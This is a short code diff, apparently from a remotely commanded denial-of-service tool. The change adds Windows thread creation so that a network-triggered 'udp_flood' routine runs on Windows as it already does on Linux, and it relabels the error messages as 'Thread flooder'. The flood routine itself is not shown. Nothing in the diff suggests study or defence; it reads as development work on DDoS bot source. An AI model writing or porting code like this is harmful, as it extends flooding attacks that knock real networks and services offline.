@@ -218,15 +218,21 @@ int parse_args (SOCKET s, pMessage m) {
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
     // CreateThread goes here
+    DWORD thr_id;
+    HANDLE hThr;
+    hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)&udp_flood, ta, 0, &thr_id);
+    if (hThr == NULL) {
+        fatal ("Thread flooder");
+    }
 
 #elif defined(__linux__)
 
     pthread_t thr;
     if (pthread_create (&thr, NULL, udp_flood, ta)) {
-        fatal ("Thread");
+        fatal ("Thread flooder");
     }
     if (pthread_join (thr, NULL)) {
-        fatal ("Join");
+        fatal ("Join thread flooder");
     }
 
 #endif
